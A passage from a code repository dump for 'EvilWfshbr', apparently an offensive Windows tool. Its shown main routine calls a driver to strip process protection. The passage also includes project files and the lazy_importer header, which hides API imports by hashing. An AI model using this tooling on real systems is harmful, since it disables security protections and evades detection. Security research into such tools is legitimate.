  BOOLEAN UnprotectSuccess = FALSE;

  for (auto Index : {0UL, 1UL, 2UL, 3UL}) {
    if (WfshUnprotectProcess(hDevice, Index)) {
      EVIL_WFSHBR_PRINT_INFO("\x1b[033m#%d Attempt: Success\x1b[0m\n", Index);
      UnprotectSuccess = TRUE;
      break;
    } else {
      EVIL_WFSHBR_PRINT_INFO("\x1b[033m#%d Attempt: Failure\x1b[0m\n", Index);
    }
  }

  if (!UnprotectSuccess) {
    EVIL_WFSHBR_PRINT_ERROR("WfshProtectProcess failed LastError(0x%lX)\n",
                            GetLastError());
    return EXIT_FAILURE;
  }


  EVIL_WFSHBR_PRINT_INFO("Process is now un-protected\n");

  //
  // Check again whether or not the current process is protected.
  //

  PrintProtectionStatus();

  EVIL_WFSHBR_PRINT_INFO("Bye.\n");

  return EXIT_SUCCESS;
}
```

`EvilWfshbr/EvilWfshbr.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{7f147aee-3aa9-42f1-9a3e-4e6a120688ef}</ProjectGuid>
    <RootNamespace>EvilWfshbr</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp20</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="EvilWfshbr.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="lazy_importer.hpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`EvilWfshbr/EvilWfshbr.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="EvilWfshbr.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="lazy_importer.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`EvilWfshbr/lazy_importer.hpp`:

```hpp
/*
 * Copyright 2018-2022 Justas Masiulis
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// === FAQ === documentation is available at https://github.com/JustasMasiulis/lazy_importer
// * Code doesn't compile with errors about pointer conversion:
//  - Try using `nullptr` instead of `NULL` or call `get()` instead of using the overloaded operator()
// * Lazy importer can't find the function I want:
//   - Double check that the module in which it's located in is actually loaded
//   - Try #define LAZY_IMPORTER_CASE_INSENSITIVE
//     This will start using case insensitive comparison globally
//   - Try #define LAZY_IMPORTER_RESOLVE_FORWARDED_EXPORTS
//     This will enable forwarded export resolution globally instead of needing explicit `forwarded()` calls

#ifndef LAZY_IMPORTER_HPP
#define LAZY_IMPORTER_HPP


#define LI_FN(name) ::li::detail::lazy_function<LAZY_IMPORTER_KHASH(#name), decltype(&name)>()

#define LI_FN_DEF(name) ::li::detail::lazy_function<LAZY_IMPORTER_KHASH(#name), name>()

#define LI_MODULE(name) ::li::detail::lazy_module<LAZY_IMPORTER_KHASH(name)>()

#ifndef LAZY_IMPORTER_CPP_FORWARD
#ifdef LAZY_IMPORTER_NO_CPP_FORWARD
#define LAZY_IMPORTER_CPP_FORWARD(t, v) v
#else
#include <utility>
#define LAZY_IMPORTER_CPP_FORWARD(t, v) std::forward<t>( v )
#endif
#endif

#include <intrin.h>

#ifndef LAZY_IMPORTER_NO_FORCEINLINE
#if defined(_MSC_VER)
#define LAZY_IMPORTER_FORCEINLINE __forceinline
#elif defined(__GNUC__) && __GNUC__ > 3
#define LAZY_IMPORTER_FORCEINLINE inline __attribute__((__always_inline__))
#else
#define LAZY_IMPORTER_FORCEINLINE inline
#endif
#else
#define LAZY_IMPORTER_FORCEINLINE inline
#endif


#ifdef LAZY_IMPORTER_CASE_INSENSITIVE
#define LAZY_IMPORTER_CASE_SENSITIVITY false
#else
#define LAZY_IMPORTER_CASE_SENSITIVITY true
#endif

#define LAZY_IMPORTER_STRINGIZE(x) #x
#define LAZY_IMPORTER_STRINGIZE_EXPAND(x) LAZY_IMPORTER_STRINGIZE(x)

#define LAZY_IMPORTER_KHASH(str) ::li::detail::khash(str, \
    ::li::detail::khash_impl( __TIME__ __DATE__ LAZY_IMPORTER_STRINGIZE_EXPAND(__LINE__) LAZY_IMPORTER_STRINGIZE_EXPAND(__COUNTER__), 2166136261 ))

namespace li { namespace detail {

    namespace win {

        struct LIST_ENTRY_T {
            const char* Flink;
            const char* Blink;
        };

        struct UNICODE_STRING_T {
            unsigned short Length;
            unsigned short MaximumLength;
            wchar_t*       Buffer;
        };

        struct PEB_LDR_DATA_T {
            unsigned long Length;
            unsigned long Initialized;
            const char*   SsHandle;
            LIST_ENTRY_T  InLoadOrderModuleList;
        };

        struct PEB_T {
            unsigned char   Reserved1[2];
            unsigned char   BeingDebugged;
            unsigned char   Reserved2[1];
            const char*     Reserved3[2];
            PEB_LDR_DATA_T* Ldr;
        };

        struct LDR_DATA_TABLE_ENTRY_T {
            LIST_ENTRY_T InLoadOrderLinks;
            LIST_ENTRY_T InMemoryOrderLinks;
            LIST_ENTRY_T InInitializationOrderLinks;
            const char*  DllBase;
            const char*  EntryPoint;
            union {
                unsigned long SizeOfImage;
                const char*   _dummy;
            };
            UNICODE_STRING_T FullDllName;
            UNICODE_STRING_T BaseDllName;

            LAZY_IMPORTER_FORCEINLINE const LDR_DATA_TABLE_ENTRY_T*
                                            load_order_next() const noexcept
            {
                return reinterpret_cast<const LDR_DATA_TABLE_ENTRY_T*>(
                    InLoadOrderLinks.Flink);
            }
        };

        struct IMAGE_DOS_HEADER { // DOS .EXE header
            unsigned short e_magic; // Magic number
            unsigned short e_cblp; // Bytes on last page of file
            unsigned short e_cp; // Pages in file
            unsigned short e_crlc; // Relocations
            unsigned short e_cparhdr; // Size of header in paragraphs
            unsigned short e_minalloc; // Minimum extra paragraphs needed
            unsigned short e_maxalloc; // Maximum extra paragraphs needed
            unsigned short e_ss; // Initial (relative) SS value
            unsigned short e_sp; // Initial SP value
            unsigned short e_csum; // Checksum
            unsigned short e_ip; // Initial IP value
            unsigned short e_cs; // Initial (relative) CS value
            unsigned short e_lfarlc; // File address of relocation table
            unsigned short e_ovno; // Overlay number
            unsigned short e_res[4]; // Reserved words
            unsigned short e_oemid; // OEM identifier (for e_oeminfo)
            unsigned short e_oeminfo; // OEM information; e_oemid specific
            unsigned short e_res2[10]; // Reserved words
            long           e_lfanew; // File address of new exe header
        };

        struct IMAGE_FILE_HEADER {
            unsigned short Machine;
            unsigned short NumberOfSections;
            unsigned long  TimeDateStamp;
            unsigned long  PointerToSymbolTable;
            unsigned long  NumberOfSymbols;
            unsigned short SizeOfOptionalHeader;
            unsigned short Characteristics;
        };

        struct IMAGE_EXPORT_DIRECTORY {
            unsigned long  Characteristics;
            unsigned long  TimeDateStamp;
            unsigned short MajorVersion;
            unsigned short MinorVersion;
            unsigned long  Name;
            unsigned long  Base;
            unsigned long  NumberOfFunctions;
            unsigned long  NumberOfNames;
            unsigned long  AddressOfFunctions; // RVA from base of image
            unsigned long  AddressOfNames; // RVA from base of image
            unsigned long  AddressOfNameOrdinals; // RVA from base of image
        };

        struct IMAGE_DATA_DIRECTORY {
            unsigned long VirtualAddress;
            unsigned long Size;
        };

        struct IMAGE_OPTIONAL_HEADER64 {
            unsigned short       Magic;
            unsigned char        MajorLinkerVersion;
            unsigned char        MinorLinkerVersion;
            unsigned long        SizeOfCode;
            unsigned long        SizeOfInitializedData;
            unsigned long        SizeOfUninitializedData;
            unsigned long        AddressOfEntryPoint;
            unsigned long        BaseOfCode;
            unsigned long long   ImageBase;
            unsigned long        SectionAlignment;
            unsigned long        FileAlignment;
            unsigned short       MajorOperatingSystemVersion;
            unsigned short       MinorOperatingSystemVersion;
            unsigned short       MajorImageVersion;
            unsigned short       MinorImageVersion;
            unsigned short       MajorSubsystemVersion;
            unsigned short       MinorSubsystemVersion;
            unsigned long        Win32VersionValue;
            unsigned long        SizeOfImage;
            unsigned long        SizeOfHeaders;
            unsigned long        CheckSum;
            unsigned short       Subsystem;
            unsigned short       DllCharacteristics;
            unsigned long long   SizeOfStackReserve;
            unsigned long long   SizeOfStackCommit;
            unsigned long long   SizeOfHeapReserve;
            unsigned long long   SizeOfHeapCommit;
            unsigned long        LoaderFlags;
            unsigned long        NumberOfRvaAndSizes;
            IMAGE_DATA_DIRECTORY DataDirectory[16];
        };

        struct IMAGE_OPTIONAL_HEADER32 {
            unsigned short       Magic;
            unsigned char        MajorLinkerVersion;
            unsigned char        MinorLinkerVersion;
            unsigned long        SizeOfCode;
            unsigned long        SizeOfInitializedData;
            unsigned long        SizeOfUninitializedData;
            unsigned long        AddressOfEntryPoint;
            unsigned long        BaseOfCode;
            unsigned long        BaseOfData;
            unsigned long        ImageBase;
            unsigned long        SectionAlignment;
            unsigned long        FileAlignment;
            unsigned short       MajorOperatingSystemVersion;
            unsigned short       MinorOperatingSystemVersion;
            unsigned short       MajorImageVersion;
            unsigned short       MinorImageVersion;
            unsigned short       MajorSubsystemVersion;
            unsigned short       MinorSubsystemVersion;
            unsigned long        Win32VersionValue;
            unsigned long        SizeOfImage;
            unsigned long        SizeOfHeaders;
            unsigned long        CheckSum;
            unsigned short       Subsystem;
            unsigned short       DllCharacteristics;
            unsigned long        SizeOfStackReserve;
            unsigned long        SizeOfStackCommit;
            unsigned long        SizeOfHeapReserve;
            unsigned long        SizeOfHeapCommit;
            unsigned long        LoaderFlags;
            unsigned long        NumberOfRvaAndSizes;
            IMAGE_DATA_DIRECTORY DataDirectory[16];
        };

        struct IMAGE_NT_HEADERS {
            unsigned long     Signature;
            IMAGE_FILE_HEADER FileHeader;
#ifdef _WIN64
            IMAGE_OPTIONAL_HEADER64 OptionalHeader;
#else
            IMAGE_OPTIONAL_HEADER32 OptionalHeader;
#endif
        };

    } // namespace win

    struct forwarded_hashes {
       unsigned module_hash;
       unsigned function_hash;
    };

    // 64 bit integer where 32 bits are used for the hash offset
    // and remaining 32 bits are used for the hash computed using it
    using offset_hash_pair = unsigned long long;

    LAZY_IMPORTER_FORCEINLINE constexpr unsigned get_hash(offset_hash_pair pair) noexcept { return ( pair & 0xFFFFFFFF ); }

    LAZY_IMPORTER_FORCEINLINE constexpr unsigned get_offset(offset_hash_pair pair) noexcept { return ( pair >> 32 ); }

    template<bool CaseSensitive = LAZY_IMPORTER_CASE_SENSITIVITY>
    LAZY_IMPORTER_FORCEINLINE constexpr unsigned hash_single(unsigned value, char c) noexcept
    {
        return static_cast<unsigned int>(
            (value ^ ((CaseSensitive && c >= 'A' && c <= 'Z') ? (c | (1 << 5)) : c)) *
            static_cast<unsigned long long>(16777619));
    }

    LAZY_IMPORTER_FORCEINLINE constexpr unsigned
        khash_impl(const char* str, unsigned value) noexcept
    {
        return (*str ? khash_impl(str + 1, hash_single(value, *str)) : value);
    }

    LAZY_IMPORTER_FORCEINLINE constexpr offset_hash_pair khash(
        const char* str, unsigned offset) noexcept
    {
        return ((offset_hash_pair{ offset } << 32) | khash_impl(str, offset));
    }

    template<class CharT = char>
    LAZY_IMPORTER_FORCEINLINE unsigned hash(const CharT* str, unsigned offset) noexcept
    {
        unsigned value = offset;

        for(;;) {
            char c = *str++;
            if(!c)
                return value;
            value = hash_single(value, c);
        }
    }

    LAZY_IMPORTER_FORCEINLINE unsigned hash(
       const win::UNICODE_STRING_T& str, unsigned offset) noexcept
    {
        auto       first = str.Buffer;
        const auto last  = first + (str.Length / sizeof(wchar_t));
        auto       value = offset;
        for(; first != last; ++first)
            value = hash_single(value, static_cast<char>(*first));

        return value;
    }

    LAZY_IMPORTER_FORCEINLINE forwarded_hashes hash_forwarded(
        const char* str, unsigned offset) noexcept
    {
        forwarded_hashes res{ offset, offset };

        for(; *str != '.'; ++str)
            res.module_hash = hash_single<true>(res.module_hash, *str);

        ++str;

        for(; *str; ++str)
            res.function_hash = hash_single(res.function_hash, *str);

        return res;
    }

    // some helper functions
    LAZY_IMPORTER_FORCEINLINE const win::PEB_T* peb() noexcept
    {
#if defined(_M_X64) || defined(__amd64__)
        return reinterpret_cast<const win::PEB_T*>(__readgsqword(0x60));
#elif defined(_M_IX86) || defined(__i386__)
        return reinterpret_cast<const win::PEB_T*>(__readfsdword(0x30));
#elif defined(_M_ARM) || defined(__arm__)
        return *reinterpret_cast<const win::PEB_T**>(_MoveFromCoprocessor(15, 0, 13, 0, 2) + 0x30);
#elif defined(_M_ARM64) || defined(__aarch64__)
        return *reinterpret_cast<const win::PEB_T**>(__getReg(18) + 0x60);
#elif defined(_M_IA64) || defined(__ia64__)
        return *reinterpret_cast<const win::PEB_T**>(static_cast<char*>(_rdteb()) + 0x60);
#else
#error Unsupported platform. Open an issue and I'll probably add support.
#endif
    }

    LAZY_IMPORTER_FORCEINLINE const win::PEB_LDR_DATA_T* ldr()
    {
        return reinterpret_cast<const win::PEB_LDR_DATA_T*>(peb()->Ldr);
    }

    LAZY_IMPORTER_FORCEINLINE const win::IMAGE_NT_HEADERS* nt_headers(
        const char* base) noexcept
    {
        return reinterpret_cast<const win::IMAGE_NT_HEADERS*>(
            base + reinterpret_cast<const win::IMAGE_DOS_HEADER*>(base)->e_lfanew);
    }

    LAZY_IMPORTER_FORCEINLINE const win::IMAGE_EXPORT_DIRECTORY* image_export_dir(
        const char* base) noexcept
    {
        return reinterpret_cast<const win::IMAGE_EXPORT_DIRECTORY*>(
            base + nt_headers(base)->OptionalHeader.DataDirectory->VirtualAddress);
    }

    LAZY_IMPORTER_FORCEINLINE const win::LDR_DATA_TABLE_ENTRY_T* ldr_data_entry() noexcept
    {
        return reinterpret_cast<const win::LDR_DATA_TABLE_ENTRY_T*>(
            ldr()->InLoadOrderModuleList.Flink);
    }

    struct exports_directory {
        const char*                        _base;
        const win::IMAGE_EXPORT_DIRECTORY* _ied;
        unsigned long                      _ied_size;

    public:
        using size_type = unsigned long;

        LAZY_IMPORTER_FORCEINLINE
        exports_directory(const char* base) noexcept : _base(base)
        {
            const auto ied_data_dir = nt_headers(base)->OptionalHeader.DataDirectory[0];
            _ied = reinterpret_cast<const win::IMAGE_EXPORT_DIRECTORY*>(
                base + ied_data_dir.VirtualAddress);
            _ied_size = ied_data_dir.Size;
        }

        LAZY_IMPORTER_FORCEINLINE explicit operator bool() const noexcept
        {
            return reinterpret_cast<const char*>(_ied) != _base;
        }

        LAZY_IMPORTER_FORCEINLINE size_type size() const noexcept
        {
            return _ied->NumberOfNames;
        }

        LAZY_IMPORTER_FORCEINLINE const char* base() const noexcept { return _base; }
        LAZY_IMPORTER_FORCEINLINE const win::IMAGE_EXPORT_DIRECTORY* ied() const noexcept
        {
            return _ied;
        }

        LAZY_IMPORTER_FORCEINLINE const char* name(size_type index) const noexcept
        {
            return reinterpret_cast<const char*>(
                _base + reinterpret_cast<const unsigned long*>(
                            _base + _ied->AddressOfNames)[index]);
        }

        LAZY_IMPORTER_FORCEINLINE const char* address(size_type index) const noexcept
        {
            const auto* const rva_table =
                reinterpret_cast<const unsigned long*>(_base + _ied->AddressOfFunctions);

            const auto* const ord_table = reinterpret_cast<const unsigned short*>(
                _base + _ied->AddressOfNameOrdinals);

            return _base + rva_table[ord_table[index]];
        }

        LAZY_IMPORTER_FORCEINLINE bool is_forwarded(
            const char* export_address) const noexcept
        {
            const auto ui_ied = reinterpret_cast<const char*>(_ied);
            return (export_address > ui_ied && export_address < ui_ied + _ied_size);
        }
    };

    struct safe_module_enumerator {
        using value_type = const detail::win::LDR_DATA_TABLE_ENTRY_T;
        value_type* value;
        value_type* head;

        LAZY_IMPORTER_FORCEINLINE safe_module_enumerator() noexcept
            : safe_module_enumerator(ldr_data_entry())
        {}

        LAZY_IMPORTER_FORCEINLINE
        safe_module_enumerator(const detail::win::LDR_DATA_TABLE_ENTRY_T* ldr) noexcept
            : value(ldr->load_order_next()), head(value)
        {}

        LAZY_IMPORTER_FORCEINLINE void reset() noexcept
        {
            value = head->load_order_next();
        }

        LAZY_IMPORTER_FORCEINLINE bool next() noexcept
        {
            value = value->load_order_next();

            return value != head && value->DllBase;
        }
    };

    struct unsafe_module_enumerator {
        using value_type = const detail::win::LDR_DATA_TABLE_ENTRY_T*;
        value_type value;

        LAZY_IMPORTER_FORCEINLINE unsafe_module_enumerator() noexcept
            : value(ldr_data_entry())
        {}

        LAZY_IMPORTER_FORCEINLINE void reset() noexcept { value = ldr_data_entry(); }

        LAZY_IMPORTER_FORCEINLINE bool next() noexcept
        {
            value = value->load_order_next();
            return true;
        }
    };

    // provides the cached functions which use Derive classes methods
    template<class Derived, class DefaultType = void*>
    class lazy_base {
    protected:
        // This function is needed because every templated function
        // with different args has its own static buffer
        LAZY_IMPORTER_FORCEINLINE static void*& _cache() noexcept
        {
            static void* value = nullptr;
            return value;
        }

    public:
        template<class T = DefaultType>
        LAZY_IMPORTER_FORCEINLINE static T safe() noexcept
        {
            return Derived::template get<T, safe_module_enumerator>();
        }

        template<class T = DefaultType, class Enum = unsafe_module_enumerator>
        LAZY_IMPORTER_FORCEINLINE static T cached() noexcept
        {
            auto& cached = _cache();
            if(!cached)
                cached = Derived::template get<void*, Enum>();

            return (T)(cached);
        }

        template<class T = DefaultType>
        LAZY_IMPORTER_FORCEINLINE static T safe_cached() noexcept
        {
            return cached<T, safe_module_enumerator>();
        }
    };

    template<offset_hash_pair OHP>
    struct lazy_module : lazy_base<lazy_module<OHP>> {
        template<class T = void*, class Enum = unsafe_module_enumerator>
        LAZY_IMPORTER_FORCEINLINE static T get() noexcept
        {
            Enum e;
            do {
                if(hash(e.value->BaseDllName, get_offset(OHP)) == get_hash(OHP))
                    return (T)(e.value->DllBase);
            } while(e.next());
            return {};
        }

        template<class T = void*, class Ldr>
        LAZY_IMPORTER_FORCEINLINE static T in(Ldr ldr) noexcept
        {
            safe_module_enumerator e((const detail::win::LDR_DATA_TABLE_ENTRY_T*)(ldr));
            do {
                if(hash(e.value->BaseDllName, get_offset(OHP)) == get_hash(OHP))
                    return (T)(e.value->DllBase);
            } while(e.next());
            return {};
        }

        template<class T = void*, class Ldr>
        LAZY_IMPORTER_FORCEINLINE static T in_cached(Ldr ldr) noexcept
        {
            auto& cached = lazy_base<lazy_module<OHP>>::_cache();
            if(!cached)
                cached = in(ldr);

            return (T)(cached);
        }
    };

    template<offset_hash_pair OHP, class T>
    struct lazy_function : lazy_base<lazy_function<OHP, T>, T> {
        using base_type = lazy_base<lazy_function<OHP, T>, T>;

        template<class... Args>
        LAZY_IMPORTER_FORCEINLINE decltype(auto) operator()(Args&&... args) const
        {
#ifndef LAZY_IMPORTER_CACHE_OPERATOR_PARENS
            return get()(LAZY_IMPORTER_CPP_FORWARD(Args, args)...);
#else
            return this->cached()(LAZY_IMPORTER_CPP_FORWARD(Args, args)...);
#endif
        }

        template<class F = T, class Enum = unsafe_module_enumerator>
        LAZY_IMPORTER_FORCEINLINE static F get() noexcept
        {
            // for backwards compatability.
            // Before 2.0 it was only possible to resolve forwarded exports when
            // this macro was enabled
#ifdef LAZY_IMPORTER_RESOLVE_FORWARDED_EXPORTS
            return forwarded<F, Enum>();
#else

            Enum e;

            do {
#ifdef LAZY_IMPORTER_HARDENED_MODULE_CHECKS
                if(!e.value->DllBase || !e.value->FullDllName.Length)
                    continue;
#endif

                const exports_directory exports(e.value->DllBase);

                if(exports) {
                    auto export_index = exports.size();
                    while(export_index--)
                        if(hash(exports.name(export_index), get_offset(OHP)) == get_hash(OHP))
                            return (F)(exports.address(export_index));
                }
            } while(e.next());
            return {};
#endif
        }

        template<class F = T, class Enum = unsafe_module_enumerator>
        LAZY_IMPORTER_FORCEINLINE static F forwarded() noexcept
        {
            detail::win::UNICODE_STRING_T name;
            forwarded_hashes              hashes{ 0, get_hash(OHP) };

            Enum e;
            do {
                name = e.value->BaseDllName;
                name.Length -= 8; // get rid of .dll extension

                if(!hashes.module_hash || hash(name, get_offset(OHP)) == hashes.module_hash) {
                    const exports_directory exports(e.value->DllBase);

                    if(exports) {
                        auto export_index = exports.size();
                        while(export_index--)
                            if(hash(exports.name(export_index), get_offset(OHP)) == hashes.function_hash) {
                                const auto addr = exports.address(export_index);

                                if(exports.is_forwarded(addr)) {
                                    hashes = hash_forwarded(
                                        reinterpret_cast<const char*>(addr),
                                        get_offset(OHP));

                                    e.reset();
                                    break;
                                }
                                return (F)(addr);
                            }
                    }
                }
            } while(e.next());
            return {};
        }

        template<class F = T>
        LAZY_IMPORTER_FORCEINLINE static F forwarded_safe() noexcept
        {
            return forwarded<F, safe_module_enumerator>();
        }

        template<class F = T, class Enum = unsafe_module_enumerator>
        LAZY_IMPORTER_FORCEINLINE static F forwarded_cached() noexcept
        {
            auto& value = base_type::_cache();
            if(!value)
                value = forwarded<void*, Enum>();
            return (F)(value);
        }

        template<class F = T>
        LAZY_IMPORTER_FORCEINLINE static F forwarded_safe_cached() noexcept
        {
            return forwarded_cached<F, safe_module_enumerator>();
        }

        template<class F = T, bool IsSafe = false, class Module>
        LAZY_IMPORTER_FORCEINLINE static F in(Module m) noexcept
        {
            if(IsSafe && !m)
                return {};

            const exports_directory exports((const char*)(m));
            if(IsSafe && !exports)
                return {};

            for(unsigned long i{};; ++i) {
                if(IsSafe && i == exports.size())
                    break;

                if(hash(exports.name(i), get_offset(OHP)) == get_hash(OHP))
                    return (F)(exports.address(i));
            }
            return {};
        }

        template<class F = T, class Module>
        LAZY_IMPORTER_FORCEINLINE static F in_safe(Module m) noexcept
        {
            return in<F, true>(m);
        }

        template<class F = T, bool IsSafe = false, class Module>
        LAZY_IMPORTER_FORCEINLINE static F in_cached(Module m) noexcept
        {
            auto& value = base_type::_cache();
            if(!value)
                value = in<void*, IsSafe>(m);
            return (F)(value);
        }

        template<class F = T, class Module>
        LAZY_IMPORTER_FORCEINLINE static F in_safe_cached(Module m) noexcept
        {
            return in_cached<F, true>(m);
        }

        template<class F = T>
        LAZY_IMPORTER_FORCEINLINE static F nt() noexcept
        {
            return in<F>(ldr_data_entry()->load_order_next()->DllBase);
        }

        template<class F = T>
        LAZY_IMPORTER_FORCEINLINE static F nt_safe() noexcept
        {
            return in_safe<F>(ldr_data_entry()->load_order_next()->DllBase);
        }

        template<class F = T>
        LAZY_IMPORTER_FORCEINLINE static F nt_cached() noexcept
        {
            return in_cached<F>(ldr_data_entry()->load_order_next()->DllBase);
        }

        template<class F = T>
        LAZY_IMPORTER_FORCEINLINE static F nt_safe_cached() noexcept
        {
